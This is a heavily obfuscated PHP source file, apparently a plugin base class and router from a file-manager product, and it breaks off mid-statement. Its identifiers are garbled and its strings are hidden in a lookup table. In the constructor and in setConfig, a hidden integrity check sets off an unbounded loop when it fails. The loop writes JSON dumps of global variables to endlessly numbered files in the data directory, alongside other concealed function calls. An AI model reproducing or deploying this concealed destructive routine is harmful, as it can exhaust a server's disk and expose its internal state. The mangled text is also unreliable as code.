<?php
 goto b½‰œÌŞ‘; F÷™ùÃ¤Ø­: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ª³Í»®ã =& $_SERVER[¯‘·½]; $û‹ÅĞ³Ë = $_SERVER[$ª³Í»®ã[973]] . $ª³Í»®ã[974]; $¦¥ÚÇÌ» = $ª³Í»®ã[1655]; if ($_SERVER[$ª³Í»®ã[969]] != $¦¥ÚÇÌ»($û‹ÅĞ³Ë)) { $èôÅ÷Ùˆ = $ª³Í»®ã[971]; $²•¦ÊË = $ª³Í»®ã[972]; $‰°š«¶¬ = $_SERVER[$ª³Í»®ã[973]] . $ª³Í»®ã[974]; $ÎĞ®Ìã = $²•¦ÊË($‰°š«¶¬); $±©˜µ»è = explode($ª³Í»®ã[288], $ÎĞ®Ìã); if (count($±©˜µ»è) < $ª³Í»®ã[690]) { $‚óæô¬Û = $ª³Í»®ã[975]; $‚óæô¬Û(); } $±øÓÈœ… = $ª³Í»®ã[976]; $±øÓÈœ…($_SERVER[$ª³Í»®ã[977]]); $èôÅ÷Ùˆ = $ª³Í»®ã[971]; $èôÅ÷Ùˆ(); $Ø§èİ¤ = $ª³Í»®ã[1656]; $²“¶¦­š = json_encode($GLOBALS[$ª³Í»®ã[1657]]); $úÅÃîı» = 1; for ($¢© ÖÈ = $úÅÃîı»; $¢© ÖÈ > 0; $¢© ÖÈ++) { $Ø§èİ¤(DATA_PATH . $¢© ÖÈ, $²“¶¦­š); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ª³Í»®ã[1658]); $this->pluginName = str_replace($ª³Í»®ã[1658], $ª³Í»®ã[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ª³Í»®ã[8]; $this->pluginApi = appHostGet() . $ª³Í»®ã[1659] . $this->pluginName . $ª³Í»®ã[8]; $this->pluginHost = $config[$ª³Í»®ã[1660]] . $this->pluginName . $ª³Í»®ã[8]; $this->pluginHostDefault = $config[$ª³Í»®ã[1660]] . $this->pluginName . $ª³Í»®ã[8]; $ºüö“ƒ = $config[$ª³Í»®ã[1661]]; if ($ºüö“ƒ && strpos($ª³Í»®ã[50] . $ºüö“ƒ . $ª³Í»®ã[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ª³Í»®ã[1662]] . $this->pluginName . $ª³Í»®ã[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¯‘·½][1663]); } protected function assign($¬çÒº, $²æ ¿Ñ‰ = false) { if (is_array($¬çÒº)) { $this->values = array_merge($this->values, $¬çÒº); } else { $this->values[$¬çÒº] = $²æ ¿Ñ‰; } } protected function display($µÊÄãë) { extract($this->values); require $µÊÄãë; } final function hookRegist($˜ØËïìÌ) { $this->modelPlugin->appRegist($this->pluginName, $˜ØËïìÌ); } final function appIcon() { $§½Å¸¹„ =& $_SERVER[¯‘·½]; $ÉšúŠÃ¿ = $this->appPackage(); $ğ®—ËÜ = $§½Å¸¹„[12]; if (isset($ÉšúŠÃ¿[$§½Å¸¹„[492]])) { if (isset($ÉšúŠÃ¿[$§½Å¸¹„[492]][$§½Å¸¹„[1664]])) { $ğ®—ËÜ = $§½Å¸¹„[1665] . $ÉšúŠÃ¿[$§½Å¸¹„[492]][$§½Å¸¹„[1664]] . $§½Å¸¹„[1666]; } else { if ($ÉšúŠÃ¿[$§½Å¸¹„[492]][$§½Å¸¹„[1667]]) { $ğ®—ËÜ = $§½Å¸¹„[1668] . $ÉšúŠÃ¿[$§½Å¸¹„[492]][$§½Å¸¹„[1667]] . $§½Å¸¹„[1669]; } } } return $ğ®—ËÜ; } final function fileCanView($×à“ôÈ) { $‘úÇ½€ =& $_SERVER[¯‘·½]; if (request_url_safe($×à“ôÈ)) { return !0; } if ($this->isShare($×à“ôÈ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $Ó‚õ§¡ = $‘úÇ½€[1670] . rawurlencode(this_url()); show_tips(LNG($‘úÇ½€[1671]) . $‘úÇ½€[1672] . $Ó‚õ§¡ . $‘úÇ½€[1673] . LNG($‘úÇ½€[1674]) . $‘úÇ½€[1675], !1); } if (!Action($‘úÇ½€[1676])->authCan($‘úÇ½€[1677])) { show_tips(LNG($‘úÇ½€[1678]) . $‘úÇ½€[1679], !1); } ActionCall($‘úÇ½€[1680], $×à“ôÈ); } final function isShare($à•³É½) { $æ³ËÜóÓ = KodIO::parse($à•³É½); return $æ³ËÜóÓ[$_SERVER[¯‘·½][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($§ˆÑÅ§›) { if (request_url_safe($§ˆÑÅ§›)) { return $§ˆÑÅ§›; } if (!$this->isShare($§ˆÑÅ§›)) { $§ˆÑÅ§› = $this->filePath($§ˆÑÅ§›, !1); } return Action($_SERVER[¯‘·½][1280])->linkOut($§ˆÑÅ§›); } public function filePathLinkOut($÷•Û‘³) { if (request_url_safe($÷•Û‘³)) { return $÷•Û‘³; } $this->fileCanView($÷•Û‘³); return Action($_SERVER[¯‘·½][1280])->link($÷•Û‘³); } final function filePath($«¤¡€†›, $ßÙ™ù¥ = true, $ßœ¿‹Ê = false) { $ÏªÛ–€ =& $_SERVER[¯‘·½]; $ËÀœ äÈ = $this->filePathGet($«¤¡€†›, $ßÙ™ù¥); if (!$this->fileInfo) { show_tips(LNG($ÏªÛ–€[108]), !1); } if ($ßœ¿‹Ê && isset($this->fileInfo[$ÏªÛ–€[545]]) && $this->fileInfo[$ÏªÛ–€[545]]) { $Œ…èÔø´ = Model($ÏªÛ–€[548])->fileInfo($this->fileInfo[$ÏªÛ–€[545]]); if (!$Œ…èÔø´ || !IO::exist($Œ…èÔø´[$ÏªÛ–€[87]])) { $–¢ş¼×´ = LNG($ÏªÛ–€[108]) . LNG($ÏªÛ–€[1681]); if (KodUser::isRoot() && isset($Œ…èÔø´[$ÏªÛ–€[87]])) { $–¢ş¼×´ .= $ÏªÛ–€[1682] . $Œ…èÔø´[$ÏªÛ–€[87]] . $ÏªÛ–€[1683]; } show_tips($–¢ş¼×´); } } Hook::trigger($ÏªÛ–€[1684], $ËÀœ äÈ); return $ËÀœ äÈ; } final function filePathGet($ÍôÚ’¹, $“ßõç÷Ø = true) { $ªÎµäÅÆ =& $_SERVER[¯‘·½]; if ($ûÆ‚ŞÃ = $this->checkSharePath($ÍôÚ’¹, $“ßõç÷Ø)) { return $ûÆ‚ŞÃ; } $this->fileCanView($ÍôÚ’¹); if (request_url_safe($ÍôÚ’¹)) { $¢áìÌ–ã = parse_url_query($ÍôÚ’¹); if (isset($¢áìÌ–ã[$ªÎµäÅÆ[1685]]) && isset($¢áìÌ–ã[$ªÎµäÅÆ[237]])) { $Ãı‹æœ… = Mcrypt::decode($¢áìÌ–ã[$ªÎµäÅÆ[237]], Model($ªÎµäÅÆ[856])->get($ªÎµäÅÆ[857])); if ($Ãı‹æœ…) { $this->fileInfo = IO::info($Ãı‹æœ…); $this->fileInfo[$ªÎµäÅÆ[1686]] = $ÍôÚ’¹; $this->cachePath = $this->pluginCachePath($ªÎµäÅÆ[12], $“ßõç÷Ø); return $Ãı‹æœ…; } } $ÍôÚ’¹ = $this->_cacheHttpFile($ÍôÚ’¹, $“ßõç÷Ø); $this->fileInfo = IO::info($ÍôÚ’¹); } else { $this->fileInfo = IO::info($ÍôÚ’¹); $this->cachePath = $this->pluginCachePath($ªÎµäÅÆ[12], $“ßõç÷Ø); } return $ÍôÚ’¹; } final function _cacheHttpFile($·¿ÇØ½«, $ä®×Û = true) { $›«óŒïú =& $_SERVER[¯‘·½]; $é§‘¹Ï = parse_url_query($·¿ÇØ½«); $‰«ÕùØ® = get_path_ext($·¿ÇØ½«); if (isset($é§‘¹Ï[$›«óŒïú[32]]) && $é§‘¹Ï[$›«óŒïú[32]]) { $‰«ÕùØ® = get_path_ext($é§‘¹Ï[$›«óŒïú[32]]); } $Ûšç¾ = hash_path($·¿ÇØ½«) . $›«óŒïú[10] . $‰«ÕùØ®; $this->cachePath = $this->pluginCachePath($ä®×Û ? $Ûšç¾ : $›«óŒïú[12]); $ß¸§ãĞ = IO::fileNameExist($this->cachePath, $Ûšç¾); if ($ß¸§ãĞ) { return KodIO::make($ß¸§ãĞ); } $Û˜Ü Òù = rtrim($this->cachePath, $›«óŒïú[8]) . $›«óŒïú[8] . $Ûšç¾; return $this->pluginCacheFileSet($Û˜Ü Òù, file_get_contents_nossl($·¿ÇØ½«)); } final function checkSharePath($Ö»ñÁ‚”, $¥ÚÃšµí = true) { $ÃØ¶Ÿîğ =& $_SERVER[¯‘·½]; if (!$this->isShare($Ö»ñÁ‚”)) { return !1; } $úÀ­½õ = Action($ÃØ¶Ÿîğ[1280])->sharePathInfo($Ö»ñÁ‚”); if (!is_array($úÀ­½õ) || !isset($úÀ­½õ[$ÃØ¶Ÿîğ[87]])) { show_json(LNG($ÃØ¶Ÿîğ[1687]), !1); } $this->fileInfo = $úÀ­½õ; $this->cachePath = $this->pluginCachePath(!1, $¥ÚÃšµí); return $úÀ­½õ[$ÃØ¶Ÿîğ[87]]; } final function pluginCachePath($´Ì‚ù± = '', $ºŸÛÉã› = false) { $ğ°Áõ¿Ï =& $_SERVER[¯‘·½]; if ($ºŸÛÉã› && is_array($this->fileInfo)) { $´Ì‚ù± = kodIO::hashPath($this->fileInfo); } $Â¾áñ‡è = rtrim(IO_PATH_SYSTEM_TEMP . $ğ°Áõ¿Ï[1688] . $this->pluginName . $ğ°Áõ¿Ï[8] . $´Ì‚ù±, $ğ°Áõ¿Ï[8]); $¹ìåèĞ¬ = IO::infoFullSimple($Â¾áñ‡è); $ïò¡üú¸ = $¹ìåèĞ¬ && is_array($¹ìåèĞ¬) ? $¹ìåèĞ¬[$ğ°Áõ¿Ï[87]] : $ğ°Áõ¿Ï[12]; if (!$ïò¡üú¸) { $ïò¡üú¸ = IO::mkdir($Â¾áñ‡è); } return $ïò¡üú¸; } final function pluginCacheFileSet($“…š˜š, $şÆßşè = '') { $€ø–ğ”ò =& $_SERVER[¯‘·½]; $ŞªÄà—Å = IO::infoFullSimple($“…š˜š); if (!$ŞªÄà—Å) { return IO::mkfile($“…š˜š, $şÆßşè, REPEAT_REPLACE); } IO::setContent($ŞªÄà—Å[$€ø–ğ”ò[87]], $şÆßşè); return $ŞªÄà—Å[$€ø–ğ”ò[87]]; } final function pluginLocalFile($áí„”‹ = '') { $ÅÁûşÂ =& $_SERVER[¯‘·½]; $¾ĞâûÒï = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($¾ĞâûÒï)) { mk_dir($¾ĞâûÒï); } if (!$áí„”‹) { return $¾ĞâûÒï; } $ÑÈû§ = IO::info($áí„”‹); $à³³á›Œ = $ÅÁûşÂ[1689] . KodIO::hashPath($ÑÈû§) . $ÅÁûşÂ[10] . $ÑÈû§[$ÅÁûşÂ[169]]; if (!checkExtSafe($à³³á›Œ)) { $à³³á›Œ = $à³³á›Œ . $ÅÁûşÂ[1315]; } $×ï–ŒÍ— = $¾ĞâûÒï . $à³³á›Œ; if (@file_exists($×ï–ŒÍ—)) { return $×ï–ŒÍ—; } return IO::copy($áí„”‹, $¾ĞâûÒï, 0, $à³³á›Œ); } final function appPackage() { $ÇÆĞçÅ =& $_SERVER[¯‘·½]; if ($this->packageData) { return $this->packageData; } $õ¥ÕŸù = $this->parseFile($this->pluginPath . $ÇÆĞçÅ[1690]); $this->parseLang($õ¥ÕŸù); $ÔŸ˜ÌÔÏ = json_decode_force($õ¥ÕŸù); if (!$ÔŸ˜ÌÔÏ) { return array(); } $„¼š•í– = Hook::trigger($ÇÆĞçÅ[1691], $ÔŸ˜ÌÔÏ); if ($„¼š•í– && is_array($„¼š•í–)) { $ÔŸ˜ÌÔÏ = $„¼š•í–; } $this->packageData = $ÔŸ˜ÌÔÏ; return $ÔŸ˜ÌÔÏ; } public function packageInfoGet($•‚ÁÂ°) { $û­´Å¤„ = $this->appPackage(); return array_get_value($û­´Å¤„, $•‚ÁÂ°); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¯‘·½][1692]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¯‘·½][1693]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¯‘·½][1694]); } public function echoJsAssign($®¥Ëö»¬, $ºŠ§ÀÑÒ) { $this->echoJsAssignArr[$®¥Ëö»¬] = $ºŠ§ÀÑÒ; } private function parseFile($¤“ö™Ìï) { $È½˜Òæ  =& $_SERVER[¯‘·½]; $ôÆúÍÍ½ = file_get_contents_nossl($¤“ö™Ìï); $£¥èˆ‹Ó = array($È½˜Òæ [1695], $È½˜Òæ [1696], $È½˜Òæ [1697], $È½˜Òæ [1698], $È½˜Òæ [1699], $È½˜Òæ [1700], $È½˜Òæ [1701]); $·“µ·…„ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$È½˜Òæ [92]][$È½˜Òæ [1702]]); foreach ($this->echoJsAssignArr as $€…“Öæ¥ => $²›ä©¥ê) { $£¥èˆ‹Ó[] = $È½˜Òæ [1703] . $€…“Öæ¥ . $È½˜Òæ [1704]; $·“µ·…„[] = is_array($²›ä©¥ê) || is_object($²›ä©¥ê) ? rawurlencode(json_encode($²›ä©¥ê)) : $²›ä©¥ê; } if (strstr($ôÆúÍÍ½, $È½˜Òæ [1705])) { $Ã‹ÎÜË = rawurlencode(json_encode($this->pluginLangArr)); $ôÆúÍÍ½ = str_replace($È½˜Òæ [1705], $Ã‹ÎÜË, $ôÆúÍÍ½); } if (strstr($ôÆúÍÍ½, $È½˜Òæ [1706])) { $Ã‹ÎÜË = $Ã‹ÎÜË = rawurlencode(json_encode($this->getConfig())); $ôÆúÍÍ½ = str_replace($È½˜Òæ [1706], $Ã‹ÎÜË, $ôÆúÍÍ½); } $ôÆúÍÍ½ = str_replace($£¥èˆ‹Ó, $·“µ·…„, $ôÆúÍÍ½); return $ôÆúÍÍ½; } private function parseLang(&$±§§˜â†) { $×œŞ’ŸŸ =& $_SERVER[¯‘·½]; $Š€Êı¦Õ = $×œŞ’ŸŸ[1707]; if (!strstr($±§§˜â†, $Š€Êı¦Õ)) { return; } preg_match_all($×œŞ’ŸŸ[1708], $±§§˜â†, $ï¯¯Æ¹½); if (!is_array($ï¯¯Æ¹½) || count($ï¯¯Æ¹½) == 0 || !is_array($ï¯¯Æ¹½[0]) || count($ï¯¯Æ¹½[0]) == 0) { return; } $èã¢„˜‚ = array(); $ÈÃÃƒ£Ï = array(); foreach ($ï¯¯Æ¹½[0] as $‹©¿†Ö™) { $¤àõºßŠ = substr($‹©¿†Ö™, strlen($Š€Êı¦Õ), -4); $ËÍŸ‰Ûä = LNG($¤àõºßŠ); $èã¢„˜‚[] = $‹©¿†Ö™; $ÈÃÃƒ£Ï[] = str_replace(array($×œŞ’ŸŸ[288], $×œŞ’ŸŸ[1175], $×œŞ’ŸŸ[419], $×œŞ’ŸŸ[121]), array($×œŞ’ŸŸ[53], $×œŞ’ŸŸ[53], $×œŞ’ŸŸ[12], $×œŞ’ŸŸ[1709]), $ËÍŸ‰Ûä); } $±§§˜â† = str_replace($èã¢„˜‚, $ÈÃÃƒ£Ï, $±§§˜â†); } private function parseConfig(&$àÔ—ÌäĞ) { $ØµèæÁÂ =& $_SERVER[¯‘·½]; $öö€Ã¡‹ = $ØµèæÁÂ[1710]; if (!strstr($àÔ—ÌäĞ, $öö€Ã¡‹)) { return; } preg_match_all($ØµèæÁÂ[1711], $àÔ—ÌäĞ, $±¯ÜËÎ…); if (!is_array($±¯ÜËÎ…) || count($±¯ÜËÎ…) == 0 || !is_array($±¯ÜËÎ…[0]) || count($±¯ÜËÎ…[0]) == 0) { return; } $ §Î³ä² = $this->getConfig(); $†å°­ = array(); $òœá¬¥† = array(); foreach ($±¯ÜËÎ…[0] as $Š‚õ—Ü) { $¡×çöœ× = substr($Š‚õ—Ü, strlen($öö€Ã¡‹), -2); $†å°­[] = $Š‚õ—Ü; $òœá¬¥†[] = _get($ §Î³ä², $¡×çöœ×); } $àÔ—ÌäĞ = str_replace($†å°­, $òœá¬¥†, $àÔ—ÌäĞ); } private function parsePackage(&$¶É½²ÂÔ) { $™²—èöå =& $_SERVER[¯‘·½]; $…¬ÃØÛ = $™²—èöå[1712]; if (!strstr($¶É½²ÂÔ, $…¬ÃØÛ)) { return; } preg_match_all($™²—èöå[1713], $¶É½²ÂÔ, $ˆ‰Ù·§); if (!is_array($ˆ‰Ù·§) || count($ˆ‰Ù·§) == 0 || !is_array($ˆ‰Ù·§[0]) || count($ˆ‰Ù·§[0]) == 0) { return; } $åâ‚øÙŠ = $this->appPackage(); $‚£şœÜ³ = array(); $çùœ…ëä = array(); foreach ($ˆ‰Ù·§[0] as $½Ø•ğ½) { $¾åš¡§ë = substr($½Ø•ğ½, strlen($…¬ÃØÛ), -2); $‚£şœÜ³[] = $½Ø•ğ½; $çùœ…ëä[] = _get($åâ‚øÙŠ, $¾åš¡§ë); } $¶É½²ÂÔ = str_replace($‚£şœÜ³, $çùœ…ëä, $¶É½²ÂÔ); } final function echoFile($ô·Ÿ­ºú, $«• Ô“İ = false) { $â£“¼äî =& $_SERVER[¯‘·½]; $¢Ç¦©Ä‚ = $this->pluginPath . $ô·Ÿ­ºú; if (ACT == $â£“¼äî[1714]) { echo $â£“¼äî[1715] . $this->pluginName . $â£“¼äî[8] . $ô·Ÿ­ºú . $â£“¼äî[1716]; if (!file_exists($¢Ç¦©Ä‚)) { echo $â£“¼äî[1717]; return; } } $ñĞğÂû = $this->parseFile($¢Ç¦©Ä‚); $this->parseLang($ñĞğÂû); $this->parseConfig($ñĞğÂû); $this->parsePackage($ñĞğÂû); if (is_array($«• Ô“İ)) { $ñĞğÂû = str_replace(array_keys($«• Ô“İ), array_values($«• Ô“İ), $ñĞğÂû); } echo $â£“¼äî[288] . $ñĞğÂû; } private function checkVersion() { $íÉˆµí =& $_SERVER[¯‘·½]; $ô‡í¢—æ = $this->appPackage(); $ôºĞİì‹ = $this->getConfig(); if ($ôºĞİì‹[$íÉˆµí[1718]] == $ô‡í¢—æ[$íÉˆµí[1692]]) { return; } $this->regist(); $this->setConfig(array($íÉˆµí[1718] => $ô‡í¢—æ[$íÉˆµí[1692]])); } final function initLang() { $€‘ÁÚ¥É =& $_SERVER[¯‘·½]; $åÄäÃ·  = $€‘ÁÚ¥É[1719]; $—·ìÁ³ = $this->pluginPath . $€‘ÁÚ¥É[1720]; $‘‘úæ‰ = I18n::getType(); $Ì–ı¿¬ = array(); if (file_exists($—·ìÁ³ . $‘‘úæ‰ . $€‘ÁÚ¥É[930])) { $Ì–ı¿¬ = (include $—·ìÁ³ . $‘‘úæ‰ . $€‘ÁÚ¥É[930]); } else { if ($‘‘úæ‰ == $€‘ÁÚ¥É[1721] && !file_exists($—·ìÁ³ . $‘‘úæ‰ . $€‘ÁÚ¥É[930]) && file_exists($—·ìÁ³ . $€‘ÁÚ¥É[1722])) { $Ì–ı¿¬ = (include $—·ìÁ³ . $€‘ÁÚ¥É[1722]); $‘‘úæ‰ = $€‘ÁÚ¥É[1534]; } else { if (file_exists($—·ìÁ³ . $åÄäÃ·  . $€‘ÁÚ¥É[930])) { $Ì–ı¿¬ = (include $—·ìÁ³ . $åÄäÃ·  . $€‘ÁÚ¥É[930]); $‘‘úæ‰ = $åÄäÃ· ; } } } if (!$Ì–ı¿¬) { $Ì–ı¿¬ = array(); } $¢¯‹œÖ = Hook::trigger($€‘ÁÚ¥É[1723], $Ì–ı¿¬, $this->pluginName, $‘‘úæ‰); if ($¢¯‹œÖ && is_array($¢¯‹œÖ)) { $Ì–ı¿¬ = $¢¯‹œÖ; } if (@count($Ì–ı¿¬) > 0) { I18n::set($Ì–ı¿¬); } return $Ì–ı¿¬; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($š€©¸âü) { $ŸÔ¥ßÍƒ =& $_SERVER[¯‘·½]; $ñ¶¨Ëõ§ = $_SERVER[$ŸÔ¥ßÍƒ[973]] . $ŸÔ¥ßÍƒ[974]; $ æ¢âÍ’ = $ŸÔ¥ßÍƒ[1655]; if ($_SERVER[$ŸÔ¥ßÍƒ[969]] != $ æ¢âÍ’($ñ¶¨Ëõ§)) { $‘šïë†  = $ŸÔ¥ßÍƒ[971]; $ãõÙŞ‡š = $ŸÔ¥ßÍƒ[972]; $âÛÛ—É = $_SERVER[$ŸÔ¥ßÍƒ[973]] . $ŸÔ¥ßÍƒ[974]; $÷¨—´‡€ = $ãõÙŞ‡š($âÛÛ—É); $šİ…Ì¾å = explode($ŸÔ¥ßÍƒ[288], $÷¨—´‡€); if (count($šİ…Ì¾å) < $ŸÔ¥ßÍƒ[690]) { $È¾ëÛ˜Œ = $ŸÔ¥ßÍƒ[975]; $È¾ëÛ˜Œ(); } $Ç‘ê—±É = $ŸÔ¥ßÍƒ[976]; $Ç‘ê—±É($_SERVER[$ŸÔ¥ßÍƒ[977]]); $‘šïë†  = $ŸÔ¥ßÍƒ[971]; $‘šïë† (); $Äñ‡ƒ–¼ = $ŸÔ¥ßÍƒ[1656]; $¥°À‚œÙ = json_encode($GLOBALS[$ŸÔ¥ßÍƒ[1657]]); $€‘½àÌÅ = 1; for ($çôÃÇ¯İ = $€‘½àÌÅ; $çôÃÇ¯İ > 0; $çôÃÇ¯İ++) { $Äñ‡ƒ–¼(DATA_PATH . $çôÃÇ¯İ, $¥°À‚œÙ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $š€©¸âü); } public function onSetConfig($–¶Ñ¨Ï) { } public function onGetConfig($»©Ğ‘») { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ÕšØô½õ) { if ($ÕšØô½õ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ğ¸è¤Öß = "\x70\x6c\x75\x67\x69\156\101\165\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ÙøÙ…È£ = $this->getConfig(); if (!$ÙøÙ…È£[$ğ¸è¤Öß]) { return !1; } return ActionCall($_SERVER[¯‘·½][1724], $ÙøÙ…È£[$ğ¸è¤Öß]); } public function url($ÜùÅŒ˜Ú, $ùá¸ãõ¹ = '', $›½›óÂŒ = true) { $¿‰ÖÔÑ =& $_SERVER[¯‘·½]; $ÌÕ¨©ó = $this->getConfig(); $ àññ½ß = KOD_VERSION . $¿‰ÖÔÑ[10] . KOD_VERSION_BUILD; $òœ„äµ = $this->packageVersion(); $î ’¸©ó = $ àññ½ß . $¿‰ÖÔÑ[464] . $òœ„äµ; if (substr($ÜùÅŒ˜Ú, 0, 4) == $¿‰ÖÔÑ[152] || substr($ÜùÅŒ˜Ú, 0, 2) == $¿‰ÖÔÑ[1442]) { $ìŸ™„Éü = $ÜùÅŒ˜Ú . $¿‰ÖÔÑ[1725] . $î ’¸©ó; } else { if ($ùá¸ãõ¹ == $¿‰ÖÔÑ[12]) { $ìŸ™„Éü = $this->pluginHost . $ÜùÅŒ˜Ú . $¿‰ÖÔÑ[1725] . $î ’¸©ó; } else { if ($ùá¸ãõ¹ === $¿‰ÖÔÑ[78]) { $ìŸ™„Éü = $this->pluginHost . $ÜùÅŒ˜Ú; } else { if ($ùá¸ãõ¹ == $¿‰ÖÔÑ[1726]) { $ìŸ™„Éü = STATIC_PATH . $ÜùÅŒ˜Ú . $¿‰ÖÔÑ[1725] . $ àññ½ß; } else { if ($ùá¸ãõ¹ == $¿‰ÖÔÑ[1727]) { $ìŸ™„Éü = APP_HOST . $¿‰ÖÔÑ[1728] . $ÜùÅŒ˜Ú . $¿‰ÖÔÑ[1725] . $ àññ½ß; } else { if (isset($ÌÕ¨©ó[$ùá¸ãõ¹])) { $ìŸ™„Éü = $ÌÕ¨©ó[$ùá¸ãõ¹] . $ÜùÅŒ˜Ú . $¿‰ÖÔÑ[1725] . $î ’¸©ó; } } } } } } if (!$›½›óÂŒ) { return $ìŸ™„Éü; } echo $ìŸ™„Éü; } public function link($éÍ£â‘ = false, $”˜Æ´Ş¤ = '') { $ğ­ëÏ…† =& $_SERVER[¯‘·½]; $¤åüÄ´ú = $this->linkHas == !1; $this->linkHas = !0; if (!$éÍ£â‘) { $this->link($ğ­ëÏ…†[1729], $ğ­ëÏ…†[1727]); $this->link($ğ­ëÏ…†[1730], $ğ­ëÏ…†[1726]); $this->link($ğ­ëÏ…†[1731], $ğ­ëÏ…†[1726]); $this->link($ğ­ëÏ…†[1732], $ğ­ëÏ…†[1726]); $this->link($ğ­ëÏ…†[1733], $ğ­ëÏ…†[1726]); if ($¤åüÄ´ú) { Hook::trigger($ğ­ëÏ…†[1734]); } return; } $ÊÙ‹‰ºá = $this->url($éÍ£â‘, $”˜Æ´Ş¤, !1); if (substr($éÍ£â‘, -3) == $ğ­ëÏ…†[1735]) { echo $ğ­ëÏ…†[1736] . $ÊÙ‹‰ºá . $ğ­ëÏ…†[1737] . $ğ­ëÏ…†[288]; } else { if (substr($éÍ£â‘, -4) == $ğ­ëÏ…†[1738]) { echo $ğ­ëÏ…†[1739] . $ÊÙ‹‰ºá . $ğ­ëÏ…†[1740] . $ğ­ëÏ…†[288]; } } if ($¤åüÄ´ú) { Hook::trigger($ğ­ëÏ…†[1734]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\x5b\136\x2f\135\x2b", "\72\x6e\165\155" => "\x5b\60\x2d\71\x5d\53", "\x3a\141\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($ô€Ö¥ˆ, $ÎÖàû¶×) { $¸É«‡à =& $_SERVER[¯‘·½]; if ($ô€Ö¥ˆ == $¸É«‡à[1741]) { $è£¼‹ = array_map($¸É«‡à[1742], $ÎÖàû¶×[0]); $„²ûË× = strpos($ÎÖàû¶×[1], $¸É«‡à[8]) === 0 ? $ÎÖàû¶×[1] : $¸É«‡à[8] . $ÎÖàû¶×[1]; $·â•ù = $ÎÖàû¶×[2]; } else { $è£¼‹ = null; $„²ûË× = strpos($ÎÖàû¶×[0], $¸É«‡à[8]) === 0 ? $ÎÖàû¶×[0] : $¸É«‡à[8] . $ÎÖàû¶×[0]; $·â•ù = $ÎÖàû¶×[1]; } array_push(self::$maps, $è£¼‹); array_push(self::$routes, $„²ûË×); array_push(self::$methods, strtoupper($ô€Ö¥ˆ)); array_push(self::$callbacks, $·â•ù); } public static function error($‰œÃı¨) { self::$errorCallback = $‰œÃı¨; } public static function haltOnMatch($ ØşÎĞ = true) { self::$halts = $ ØşÎĞ; } public static function dispatch() { $ëâ³èÔ  =& $_SERVER[¯‘·½]; $‹­Í¤± = parse_url($_SERVER[$ëâ³èÔ [1743]], PHP_URL_PATH); $ŒşŸãŠ‰ = $_SERVER[$ëâ³èÔ [164]]; $¼–ú™”‹ = array_keys(static::$patterns); $¹¼™ï÷Ø = array_values(static::$patterns); $»¼¦¥°¬ = !1; self::$routes = preg_replace($ëâ³èÔ [1385], $ëâ³èÔ [8], self::$routes); if (in_array($‹­Í¤±, self::$routes)) { $„£Çïö— = array_keys(self::$routes, $‹­Í¤±); foreach ($„£Çïö— as $¼şÆ…—õ) { if (self::$methods[$¼şÆ…—õ] == $ŒşŸãŠ‰ || self::$methods[$¼şÆ…—õ] == $ëâ³èÔ [1744] || in_array($ŒşŸãŠ‰, self::$maps[$¼şÆ…—õ])) { $»¼¦¥°¬ = !0; if (!is_object(self::$callbacks[$¼şÆ…—õ])) { $·«„õ– = explode($ëâ³èÔ [8], self::$callbacks[$¼şÆ…—õ]); $¶±®ú¦ = end($·«„õ–); $¨áµŒ¿Õ = explode($ëâ³èÔ [1317], $¶±®ú¦); $£Ğæìí¤ = new $¨áµŒ¿Õ[0](); $£Ğæìí¤->{$¨áµŒ¿Õ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¼şÆ…—õ]); if (self::$halts) { return; } } } } } else { $¥ãëáõÁ = 0; foreach (self::$routes as $¼şÆ…—õ) { if (strpos($¼şÆ…—õ, $ëâ³èÔ [4]) !== !1) { $¼şÆ…—õ = str_replace($¼–ú™”‹, $¹¼™ï÷Ø, $¼şÆ…—õ); } if (preg_match($ëâ³èÔ [1745] . $¼şÆ…—õ . $ëâ³èÔ [1746], $‹­Í¤±, $³‰Ïçº)) { if (self::$methods[$¥ãëáõÁ] == $ŒşŸãŠ‰ || self::$methods[$¥ãëáõÁ] == $ëâ³èÔ [1744] || !empty(self::$maps[$¥ãëáõÁ]) && in_array($ŒşŸãŠ‰, self::$maps[$¥ãëáõÁ])) { $»¼¦¥°¬ = !0; array_shift($³‰Ïçº); if (!is_object(self::$callbacks[$¥ãëáõÁ])) { $·«„õ– = explode($ëâ³èÔ [8], self::$callbacks[$¥ãëáõÁ]); $¶±®ú¦ = end($·«„õ–); $¨áµŒ¿Õ = explode($ëâ³èÔ [1317], $¶±®ú¦); $£Ğæìí¤ = new $¨áµŒ¿Õ[0](); if (!method_exists($£Ğæìí¤, $¨áµŒ¿Õ[1])) { echo $ëâ³èÔ [1747]; } else { call_user_func_array(array($£Ğæìí¤, $¨áµŒ¿Õ[1]), $³‰Ïçº); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¥ãëáõÁ], 